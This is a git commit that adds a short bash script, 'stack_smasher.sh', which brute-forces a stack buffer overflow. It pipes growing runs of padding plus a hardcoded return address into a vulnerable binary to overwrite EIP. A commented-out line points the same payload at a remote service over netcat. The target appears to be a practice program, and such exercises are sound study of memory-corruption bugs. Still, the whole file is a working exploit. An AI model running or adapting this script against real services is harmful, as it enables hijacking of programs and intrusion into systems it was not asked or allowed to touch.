363df2c628a25a8d21ba6040b3f7b5dd21f27ab9
Tony36 <tatsuhiko36@gmail.com>
2022-12-27 21:20:46 +0800

    uploaded stack_smasher.sh

---
+++ stack_smasher/stack_smasher.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+
+
+## A super lazy script to perform stack buffer overflow and overwrite EIP
+
+target_program='./vul_stackoverflow'
+target_address='\xd4\x85\x04\x08'
+#targe_server='nc example.com 8888' ## Uncomment this section if the target program is hosted on remote server.
+
+# You may need to change the size of loop depending on the size of the buffer.
+for i in {1..100};
+	do
+		echo $i
+		garbage_data=$(yes 'a' | head -n $i | tr -d '\n')
+		echo $garbage_data$target_address
+		echo -e $garbage_data$target_address | $target_program
+		#echo -e $garbage_data$target_address | $target_server
+	done
